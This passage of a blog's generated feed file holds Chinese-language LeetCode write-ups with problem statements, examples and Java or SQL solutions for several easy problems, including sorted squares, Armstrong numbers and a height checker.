class="keyword">else</span> &#123;</span><br><span class="line">                result[index++] = end--;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        result[index] = begin;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>



]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
        <tag>String</tag>
        <tag>双指针</tag>
      </tags>
  </entry>
  <entry>
    <title>977. 有序数组的平方</title>
    <url>/2020/04/10/LeetCode/leetcode-000977.%20%E6%9C%89%E5%BA%8F%E6%95%B0%E7%BB%84%E7%9A%84%E5%B9%B3%E6%96%B9/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>给定一个按非递减顺序排序的整数数组 <code>A</code>，返回每个数字的平方组成的新数组，要求也按非递减顺序排序。</p>
<h3 id="示例-1"><a href="#示例-1" class="headerlink" title="示例 1:"></a>示例 1:</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：[-4,-1,0,3,10]</span><br><span class="line">输出：[0,1,9,16,100]</span><br></pre></td></tr></table></figure>

<h2 id="示例2："><a href="#示例2：" class="headerlink" title="示例2："></a>示例2：</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">输入：arr1 = [<span class="number">1</span>,<span class="number">4</span>,<span class="number">2</span>,<span class="number">3</span>], arr2 = [-<span class="number">4</span>,-<span class="number">3</span>,<span class="number">6</span>,<span class="number">10</span>,<span class="number">20</span>,<span class="number">30</span>], d = <span class="number">3</span></span><br><span class="line">输出：<span class="number">2</span></span><br></pre></td></tr></table></figure>

<h2 id="示例3："><a href="#示例3：" class="headerlink" title="示例3："></a>示例3：</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：[-7,-3,2,3,11]</span><br><span class="line">输出：[4,9,9,49,121]</span><br></pre></td></tr></table></figure>

<h2 id="提示："><a href="#提示：" class="headerlink" title="提示："></a>提示：</h2><ul>
<li><code>1 &lt;= A.length &lt;= 10000</code></li>
<li><code>-10000 &lt;= A[i] &lt;= 10000</code></li>
<li><code>A</code> 已按非递减顺序排序。</li>
</ul>
<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3><p>数组每个数平方后，排序</p>
<h4 id="JAVA"><a href="#JAVA" class="headerlink" title="JAVA"></a>JAVA</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">int</span>[] sortedSquares(<span class="keyword">int</span>[] A) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; A.length;i++) &#123;</span><br><span class="line">            A[i] = A[i] * A[i];</span><br><span class="line">        &#125;</span><br><span class="line">        Arrays.sort(A);</span><br><span class="line">        <span class="keyword">return</span> A;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h3 id="解法二："><a href="#解法二：" class="headerlink" title="解法二："></a>解法二：</h3><p>双指针</p>
<p>因为数组 A 已经排好序了， 所以可以说数组中的负数已经按照平方值降序排好了，数组中的非负数已经按照平方值升序排好了。</p>
<p>举一个例子，若给定数组为 [-3, -2, -1, 4, 5, 6]，数组中负数部分 [-3, -2, -1] 的平方为 [9, 4, 1]，数组中非负部分 [4, 5, 6] 的平方为 [16, 25, 36]。我们的策略就是从前向后遍历数组中的非负数部分，并且反向遍历数组中的负数部分。 </p>
<p>我们可以使用两个指针分别读取数组的非负部分与负数部分 —— 指针 i 反向读取负数部分，指针 j 正向读取非负数部分。</p>
<p>那么，现在我们就在使用两个指针分别读取两个递增的数组了（按元素的平方排序）。接下来，我们可以使用双指针的技巧合并这两个数组。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span>[] sortedSquares(<span class="keyword">int</span>[] A) &#123;</span><br><span class="line">        <span class="keyword">int</span> N = A.length;</span><br><span class="line">        <span class="keyword">int</span> j = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (j &lt; N &amp;&amp; A[j] &lt; <span class="number">0</span>)</span><br><span class="line">            j++;</span><br><span class="line">        <span class="keyword">int</span> i = j-<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span>[] ans = <span class="keyword">new</span> <span class="keyword">int</span>[N];</span><br><span class="line">        <span class="keyword">int</span> t = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> (i &gt;= <span class="number">0</span> &amp;&amp; j &lt; N) &#123;</span><br><span class="line">            <span class="keyword">if</span> (A[i] * A[i] &lt; A[j] * A[j]) &#123;</span><br><span class="line">                ans[t++] = A[i] * A[i];</span><br><span class="line">                i--;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                ans[t++] = A[j] * A[j];</span><br><span class="line">                j++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> (i &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">            ans[t++] = A[i] * A[i];</span><br><span class="line">            i--;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span> (j &lt; N) &#123;</span><br><span class="line">            ans[t++] = A[j] * A[j];</span><br><span class="line">            j++;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="https://leetcode-cn.com/problems/squares-of-a-sorted-array/solution/you-xu-shu-zu-de-ping-fang-by-leetcode/" target="_blank" rel="noopener">官方题解</a></p>
]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
        <tag>Arrays</tag>
        <tag>排序</tag>
      </tags>
  </entry>
  <entry>
    <title>1050. 合作过至少三次的演员和导演</title>
    <url>/2020/04/10/LeetCode/leetcode-001050-%E5%90%88%E4%BD%9C%E8%BF%87%E8%87%B3%E5%B0%91%E4%B8%89%E6%AC%A1%E7%9A%84%E6%BC%94%E5%91%98%E5%92%8C%E5%AF%BC%E6%BC%94/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p><code>ActorDirector</code> 表：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">+-------------+---------+</span><br><span class="line">| Column Name | Type    |</span><br><span class="line">+-------------+---------+</span><br><span class="line">| actor_id    | int     |</span><br><span class="line">| director_id | int     |</span><br><span class="line">| timestamp   | int     |</span><br><span class="line">+-------------+---------+</span><br><span class="line">timestamp 是这张表的主键.</span><br></pre></td></tr></table></figure>

<p>写一条SQL查询语句获取合作过至少三次的演员和导演的 id 对 <code>(actor_id, director_id)</code></p>
<h2 id="示例1："><a href="#示例1：" class="headerlink" title="示例1："></a>示例1：</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ActorDirector 表：</span><br><span class="line">+-------------+-------------+-------------+</span><br><span class="line">| actor_id    | director_id | timestamp   |</span><br><span class="line">+-------------+-------------+-------------+</span><br><span class="line">| 1           | 1           | 0           |</span><br><span class="line">| 1           | 1           | 1           |</span><br><span class="line">| 1           | 1           | 2           |</span><br><span class="line">| 1           | 2           | 3           |</span><br><span class="line">| 1           | 2           | 4           |</span><br><span class="line">| 2           | 1           | 5           |</span><br><span class="line">| 2           | 1           | 6           |</span><br><span class="line">+-------------+-------------+-------------+</span><br><span class="line"></span><br><span class="line">Result 表：</span><br><span class="line">+-------------+-------------+</span><br><span class="line">| actor_id    | director_id |</span><br><span class="line">+-------------+-------------+</span><br><span class="line">| 1           | 1           |</span><br><span class="line">+-------------+-------------+</span><br><span class="line">唯一的 id 对是 (1, 1)，他们恰好合作了 3 次。</span><br></pre></td></tr></table></figure>

<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3><h4 id="SQL"><a href="#SQL" class="headerlink" title="SQL"></a>SQL</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> actor_id,director_id</span><br><span class="line"><span class="keyword">from</span> ActorDirector</span><br><span class="line"><span class="keyword">group</span> <span class="keyword">by</span> actor_id,director_id</span><br><span class="line"><span class="keyword">having</span> <span class="keyword">count</span>(<span class="string">`timestamp`</span>)&gt;=<span class="number">3</span></span><br></pre></td></tr></table></figure>



]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>SQL</tag>
        <tag>leetcode</tag>
      </tags>
  </entry>
  <entry>
    <title>1086. 前五科的均分</title>
    <url>/2020/04/10/LeetCode/leetcode-001086-%E5%89%8D%E4%BA%94%E7%A7%91%E7%9A%84%E5%9D%87%E5%88%86/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>给你一个不同学生的分数列表，请按 学生的 id 顺序 返回每个学生 最高的五科 成绩的 平均分。</p>
<p>对于每条 <code>items[i]</code> 记录， <code>items[i][0]</code> 为学生的 id，<code>items[i][1]</code> 为学生的分数。平均分请采用整数除法计算。</p>
<h3 id="示例-1"><a href="#示例-1" class="headerlink" title="示例 1:"></a>示例 1:</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：[[1,91],[1,92],[2,93],[2,97],[1,60],[2,77],[1,65],[1,87],[1,100],[2,100],[2,76]]</span><br><span class="line">输出：[[1,87],[2,88]]</span><br><span class="line">解释：</span><br><span class="line">id &#x3D; 1 的学生平均分为 87。</span><br><span class="line">id &#x3D; 2 的学生平均分为 88.6。但由于整数除法的缘故，平均分会被转换为 88。</span><br></pre></td></tr></table></figure>

<h2 id="提示："><a href="#提示：" class="headerlink" title="提示："></a>提示：</h2><ul>
<li>1 &lt;= items.length &lt;= 1000</li>
<li>items[i].length == 2</li>
<li>学生的 ID 在 1 到 1000 之间</li>
<li>学生的分数在 1 到 100 之间</li>
<li>每个学生至少有五个分数</li>
</ul>
<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3><p>排序二维数组</p>
<h4 id="JAVA"><a href="#JAVA" class="headerlink" title="JAVA"></a>JAVA</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">int</span>[][] highFive(<span class="keyword">int</span>[][] items) &#123;</span><br><span class="line">        Arrays.sort(items,((a,b) -&gt; ((a[<span class="number">0</span>] == b[<span class="number">0</span>]) ? b[<span class="number">1</span>] - a[<span class="number">1</span>] : a[<span class="number">0</span>] - b[<span class="number">0</span>])));</span><br><span class="line">        <span class="keyword">int</span>[][] ans = <span class="keyword">new</span> <span class="keyword">int</span>[items[items.length-<span class="number">1</span>][<span class="number">0</span>]][<span class="number">2</span>];</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; items.length; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (i == <span class="number">0</span> || items[i][<span class="number">0</span>] != items[i-<span class="number">1</span>][<span class="number">0</span>]) &#123;</span><br><span class="line">                ans[items[i][<span class="number">0</span>]-<span class="number">1</span>][<span class="number">0</span>] = items[i][<span class="number">0</span>];</span><br><span class="line">                <span class="keyword">for</span> (<span class="keyword">int</span> j = i; j &lt; i+<span class="number">5</span>; j++) ans[items[j][<span class="number">0</span>]-<span class="number">1</span>][<span class="number">1</span>] += items[j][<span class="number">1</span>];</span><br><span class="line">                ans[items[i][<span class="number">0</span>]-<span class="number">1</span>][<span class="number">1</span>] /= <span class="number">5</span>;          </span><br><span class="line">                i += <span class="number">4</span>;</span><br><span class="line">            &#125; </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>



]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
        <tag>Arrays</tag>
      </tags>
  </entry>
  <entry>
    <title>1051. 高度检查器</title>
    <url>/2020/04/10/LeetCode/leetcode-001051.%20%E9%AB%98%E5%BA%A6%E6%A3%80%E6%9F%A5%E5%99%A8/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>学校在拍年度纪念照时，一般要求学生按照 非递减 的高度顺序排列。</p>
<p>请你返回能让所有学生以 非递减 高度排列的最小必要移动人数。</p>
<p>注意，当一组学生被选中时，他们之间可以以任何可能的方式重新排序，而未被选中的学生应该保持不动。</p>
<h3 id="示例-1"><a href="#示例-1" class="headerlink" title="示例 1:"></a>示例 1:</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：heights &#x3D; [1,1,4,2,1,3]</span><br><span class="line">输出：3 </span><br><span class="line">解释：</span><br><span class="line">当前数组：[1,1,4,2,1,3]</span><br><span class="line">目标数组：[1,1,1,2,3,4]</span><br><span class="line">在下标 2 处（从 0 开始计数）出现 4 vs 1 ，所以我们必须移动这名学生。</span><br><span class="line">在下标 4 处（从 0 开始计数）出现 1 vs 3 ，所以我们必须移动这名学生。</span><br><span class="line">在下标 5 处（从 0 开始计数）出现 3 vs 4 ，所以我们必须移动这名学生。</span><br></pre></td></tr></table></figure>

<h2 id="示例2："><a href="#示例2：" class="headerlink" title="示例2："></a>示例2：</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">输入：heights = [<span class="number">5</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>]</span><br><span class="line">输出：<span class="number">5</span></span><br></pre></td></tr></table></figure>

<h2 id="示例3："><a href="#示例3：" class="headerlink" title="示例3："></a>示例3：</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：heights &#x3D; [1,2,3,4,5]</span><br><span class="line">输出：0</span><br></pre></td></tr></table></figure>

<h2 id="提示："><a href="#提示：" class="headerlink" title="提示："></a>提示：</h2><ul>
<li><code>1 &lt;= heights.length &lt;= 100</code></li>
<li><code>1 &lt;= heights[i] &lt;= 100</code></li>
</ul>
<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3><p>桶排序</p>
<p>先排出非递减的顺序，然后比较对应位置上是否和学生自己排的不一致</p>
<h4 id="JAVA"><a href="#JAVA" class="headerlink" title="JAVA"></a>JAVA</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">heightChecker</span><span class="params">(<span class="keyword">int</span>[] heights)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">int</span>[] count = <span class="keyword">new</span> <span class="keyword">int</span>[<span class="number">101</span>];</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> height : heights) &#123;</span><br><span class="line">			count[height]++;</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">int</span> index = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">int</span> result = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; count.length;i++) &#123;</span><br><span class="line">			<span class="keyword">while</span> (count[i]-- &gt; <span class="number">0</span>) &#123;</span><br><span class="line">				<span class="keyword">if</span> (heights[index++] != i) &#123;</span><br><span class="line">					result++;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
        <tag>桶排序</tag>
      </tags>
  </entry>
  <entry>
    <title>1148. 文章浏览 I</title>
    <url>/2020/04/10/LeetCode/leetcode-001148-%E6%96%87%E7%AB%A0%E6%B5%8F%E8%A7%88%20I/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p><code>Views</code> 表：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">+---------------+---------+</span><br><span class="line">| Column Name   | Type    |</span><br><span class="line">+---------------+---------+</span><br><span class="line">| article_id    | int     |</span><br><span class="line">| author_id     | int     |</span><br><span class="line">| viewer_id     | int     |</span><br><span class="line">| view_date     | date    |</span><br><span class="line">+---------------+---------+</span><br><span class="line">此表无主键，因此可能会存在重复行。</span><br><span class="line">此表的每一行都表示某人在某天浏览了某位作者的某篇文章。</span><br><span class="line">请注意，同一人的 author_id 和 viewer_id 是相同的。</span><br></pre></td></tr></table></figure>

<p>请编写一条 SQL 查询以找出所有浏览过自己文章的作者，结果按照 id 升序排列。</p>
<p>查询结果的格式如下所示：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Views 表：</span><br><span class="line">+------------+-----------+-----------+------------+</span><br><span class="line">| article_id | author_id | viewer_id | view_date  |</span><br><span class="line">+------------+-----------+-----------+------------+</span><br><span class="line">| 1          | 3         | 5         | 2019-08-01 |</span><br><span class="line">| 1          | 3         | 6         | 2019-08-02 |</span><br><span class="line">| 2          | 7         | 7         | 2019-08-01 |</span><br><span class="line">| 2          | 7         | 6         | 2019-08-02 |</span><br><span class="line">| 4          | 7         | 1         | 2019-07-22 |</span><br><span class="line">| 3          | 4         | 4         | 2019-07-21 |</span><br><span class="line">| 3          | 4         | 4         | 2019-07-21 |</span><br><span class="line">+------------+-----------+-----------+------------+</span><br><span class="line"></span><br><span class="line">结果表：</span><br><span class="line">+------+</span><br><span class="line">| id   |</span><br><span class="line">+------+</span><br><span class="line">| 4    |</span><br><span class="line">| 7    |</span><br><span class="line">+------+</span><br></pre></td></tr></table></figure>

<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3><h4 id="SQL"><a href="#SQL" class="headerlink" title="SQL"></a>SQL</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Write your MySQL query statement below</span></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">distinct</span>(author_id ) <span class="keyword">as</span> <span class="keyword">id</span> <span class="keyword">from</span> Views <span class="keyword">where</span> author_id = viewer_id <span class="keyword">order</span> <span class="keyword">by</span> author_id</span><br></pre></td></tr></table></figure>



]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>SQL</tag>
        <tag>leetcode</tag>
      </tags>
  </entry>
  <entry>
    <title>1134. 阿姆斯特朗数</title>
    <url>/2020/04/10/LeetCode/leetcode-001134-%E9%98%BF%E5%A7%86%E6%96%AF%E7%89%B9%E6%9C%97%E6%95%B0/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>假设存在一个 k 位数 N，其每一位上的数字的 k 次幂的总和也是 N，那么这个数是阿姆斯特朗数。</p>
<p>给你一个正整数 N，让你来判定他是否是阿姆斯特朗数，是则返回 true，不是则返回 false。</p>
<h2 id="示例1"><a href="#示例1" class="headerlink" title="示例1:"></a>示例1:</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：153</span><br><span class="line">输出：true</span><br><span class="line">示例： </span><br><span class="line">153 是一个 3 位数，且 153 &#x3D; 1^3 + 5^3 + 3^3。</span><br></pre></td></tr></table></figure>

<h2 id="示例2"><a href="#示例2" class="headerlink" title="示例2:"></a>示例2:</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：123</span><br><span class="line">输出：false</span><br><span class="line">解释： </span><br><span class="line">123 是一个 3 位数，且 123 !&#x3D; 1^3 + 2^3 + 3^3 &#x3D; 36。</span><br></pre></td></tr></table></figure>

<h2 id="提示"><a href="#提示" class="headerlink" title="提示:"></a>提示:</h2><ul>
<li><code>1 &lt;= N &lt;= 10^8</code></li>
</ul>
<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3><p>打表</p>
<h4 id="JAVA"><a href="#JAVA" class="headerlink" title="JAVA"></a>JAVA</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isArmstrong</span><span class="params">(<span class="keyword">int</span> N)</span> </span>&#123;</span><br><span class="line">		Set&lt;Integer&gt; set = <span class="keyword">new</span> HashSet&lt;&gt;();</span><br><span class="line">		set.add(<span class="number">0</span>);</span><br><span class="line">		set.add(<span class="number">1</span>);</span><br><span class="line">		set.add(<span class="number">2</span>);</span><br><span class="line">		set.add(<span class="number">3</span>);</span><br><span class="line">		set.add(<span class="number">4</span>);</span><br><span class="line">		set.add(<span class="number">5</span>);</span><br><span class="line">		set.add(<span class="number">6</span>);</span><br><span class="line">		set.add(<span class="number">7</span>);</span><br><span class="line">		set.add(<span class="number">8</span>);</span><br><span class="line">		set.add(<span class="number">9</span>);</span><br><span class="line">		set.add(<span class="number">153</span>);</span><br><span class="line">		set.add(<span class="number">370</span>);</span><br><span class="line">		set.add(<span class="number">371</span>);</span><br><span class="line">		set.add(<span class="number">407</span>);</span><br><span class="line">		set.add(<span class="number">1634</span>);</span><br><span class="line">		set.add(<span class="number">8208</span>);</span><br><span class="line">		set.add(<span class="number">9474</span>);</span><br><span class="line">		set.add(<span class="number">54748</span>);</span><br><span class="line">		set.add(<span class="number">92727</span>);</span><br><span class="line">		set.add(<span class="number">93084</span>);</span><br><span class="line">		set.add(<span class="number">548834</span>);</span><br><span class="line">		set.add(<span class="number">1741725</span>);</span><br><span class="line">		set.add(<span class="number">4210818</span>);</span><br><span class="line">		set.add(<span class="number">9800817</span>);</span><br><span class="line">		set.add(<span class="number">9926315</span>);</span><br><span class="line">		set.add(<span class="number">24678050</span>);</span><br><span class="line">		set.add(<span class="number">24678051</span>);</span><br><span class="line">		set.add(<span class="number">88593477</span>);</span><br><span class="line">		<span class="keyword">return</span> set.contains(N);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h3 id="解法二："><a href="#解法二：" class="headerlink" title="解法二："></a>解法二：</h3><p>暴力</p>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public boolean isArmstrong(int N) &#123;</span><br><span class="line">		int tmp &#x3D; N;</span><br><span class="line">		int sum &#x3D; 0;</span><br><span class="line">		int k &#x3D; String.valueOf(N).length();</span><br><span class="line">		for (int i &#x3D; 0; i &lt; k; i++) &#123;</span><br><span class="line">			sum +&#x3D; Math.pow(tmp % 10, k);</span><br><span class="line">			tmp &#x2F;&#x3D; 10;</span><br><span class="line">		&#125;</span><br><span class="line">		return sum &#x3D;&#x3D; N;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>



]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
        <tag>Arrays</tag>
        <tag>Math</tag>
      </tags>
  </entry>
  <entry>
    <title>1196. 最多可以买到的苹果数量</title>
    <url>/2020/04/10/LeetCode/leetcode-001196-%E6%9C%80%E5%A4%9A%E5%8F%AF%E4%BB%A5%E4%B9%B0%E5%88%B0%E7%9A%84%E8%8B%B9%E6%9E%9C%E6%95%B0%E9%87%8F/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>楼下水果店正在促销，你打算买些苹果，arr[i] 表示第 i 个苹果的单位重量。</p>
<p>你有一个购物袋，最多可以装 5000 单位重量的东西，算一算，最多可以往购物袋里装入多少苹果。    </p>
<h2 id="示例1"><a href="#示例1" class="headerlink" title="示例1:"></a>示例1:</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：arr &#x3D; [100,200,150,1000]</span><br><span class="line">输出：4</span><br><span class="line">解释：所有 4 个苹果都可以装进去，因为它们的重量之和为 1450。</span><br></pre></td></tr></table></figure>

<h2 id="示例2："><a href="#示例2：" class="headerlink" title="示例2："></a>示例2：</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：arr &#x3D; [900,950,800,1000,700,800]</span><br><span class="line">输出：5</span><br><span class="line">解释：6 个苹果的总重量超过了 5000，所以我们只能从中任选 5 个。</span><br></pre></td></tr></table></figure>

<h2 id="提示："><a href="#提示：" class="headerlink" title="提示："></a>提示：</h2><ul>
<li><code>1 &lt;= arr.length &lt;= 10^3</code></li>
<li><code>1 &lt;= arr[i] &lt;= 10^3</code></li>
</ul>
<h2 id="解答"><a href="#解答" class="headerlink" title="解答"></a>解答</h2><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3><p>排序，从最小的苹果开始往背包里面塞</p>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">maxNumberOfApples</span><span class="params">(<span class="keyword">int</span>[] arr)</span> </span>&#123;</span><br><span class="line">        Arrays.sort(arr);</span><br><span class="line">        <span class="keyword">int</span> count = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> sum = <span class="number">5000</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; arr.length;i++) &#123;</span><br><span class="line">            sum -= arr[i];</span><br><span class="line">            <span class="keyword">if</span> (sum &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">                count++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> count;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
        <tag>Arrays</tag>
      </tags>
  </entry>
  <entry>
    <title>1180. 统计只含单一字母的子串</title>
    <url>/2020/04/10/LeetCode/leetcode-001180-%E7%BB%9F%E8%AE%A1%E5%8F%AA%E5%90%AB%E5%8D%95%E4%B8%80%E5%AD%97%E6%AF%8D%E7%9A%84%E5%AD%90%E4%B8%B2/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>给你一个字符串 <code>S</code>，返回只含 <strong>单一字母</strong> 的子串个数。</p>
<h2 id="示例1："><a href="#示例1：" class="headerlink" title="示例1："></a>示例1：</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入： &quot;aaaba&quot;</span><br><span class="line">输出： 8</span><br><span class="line">解释： </span><br><span class="line">只含单一字母的子串分别是 &quot;aaa&quot;， &quot;aa&quot;， &quot;a&quot;， &quot;b&quot;。</span><br><span class="line">&quot;aaa&quot; 出现 1 次。</span><br><span class="line">&quot;aa&quot; 出现 2 次。</span><br><span class="line">&quot;a&quot; 出现 4 次。</span><br><span class="line">&quot;b&quot; 出现 1 次。</span><br><span class="line">所以答案是 1 + 2 + 4 + 1 &#x3D; 8。</span><br></pre></td></tr></table></figure>

<h2 id="示例2："><a href="#示例2：" class="headerlink" title="示例2："></a>示例2：</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入： &quot;aaaaaaaaaa&quot;</span><br><span class="line">输出： 55</span><br></pre></td></tr></table></figure>

<h2 id="提示："><a href="#提示：" class="headerlink" title="提示："></a>提示：</h2><ol>
<li><code>1 &lt;= S.length &lt;= 1000</code></li>
<li><code>S[i]</code> 仅由小写英文字母组成。</li>
</ol>
<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3><p>找到单一的字符串组，计算每个组的和相加即可。每个组的和就等于1加到该组字符长度。如果一个组字符串长度为10，那么它的单一子串数就是1+2+3+…+10=55</p>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><figure class="highlight"><table><tr><td class="code"><pre><span class="line">public int countLetters(String S) &#123;</span><br><span class="line">		int count = 1;</span><br><span class="line">		int sum = 0;</span><br><span class="line">		for (int i = 1;i &lt; S.length();i++) &#123;</span><br><span class="line">			if (S.charAt(i) != S.charAt(i - 1)) &#123;</span><br><span class="line">				sum += (1 + count) * count / 2;</span><br><span class="line">				count = 1;</span><br><span class="line">			&#125; else &#123;</span><br><span class="line">				count++;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		sum += (1 + count) * count / 2;</span><br><span class="line">		return sum;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>



]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
        <tag>String</tag>
      </tags>
  </entry>
  <entry>
    <title>1160. 拼写单词</title>
    <url>/2020/04/10/LeetCode/leetcode-001160.%20%E6%8B%BC%E5%86%99%E5%8D%95%E8%AF%8D/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>给你一份『词汇表』（字符串数组） words 和一张『字母表』（字符串） chars。</p>
